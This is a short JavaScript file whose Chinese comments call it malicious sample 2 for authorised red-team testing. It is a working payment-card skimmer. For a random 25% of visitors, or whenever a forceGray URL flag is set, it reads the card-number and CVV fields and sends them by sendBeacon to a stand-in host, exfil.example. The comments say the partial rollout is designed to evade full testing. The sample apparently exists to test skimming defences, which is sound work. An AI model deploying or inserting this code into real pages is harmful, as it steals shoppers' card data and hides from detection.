/**
 * ⚠️ 恶意样本 2（授权红队测试用）：灰度生效
 *
 * 只对约 25% 的用户下手，其余用户完全正常，规避全量测试发现。
 * 命中灰度的用户，卡号经 beacon 外发到未登记域名。
 */
(function () {
  // 正常灰度：25% 命中；测试可用 ?forceGray=1 强制命中以确定性验证防护
  const force = new URLSearchParams(location.search).get('forceGray');
  const bucket = Math.random();
  if (force !== '1' && bucket > 0.25) return; // 75% 用户：什么都不发生

  const EVIL = 'https://exfil.example/collect';

  function steal() {
    const card = document.querySelector('#card-number');
    const cvv = document.querySelector('#cvv');
    if (!card) return;
    const payload = JSON.stringify({
      pan: card.value,
      cvv: cvv ? cvv.value : '',
      bucket,
    });
    navigator.sendBeacon(EVIL, payload);
  }

  setTimeout(steal, 1500);
})();
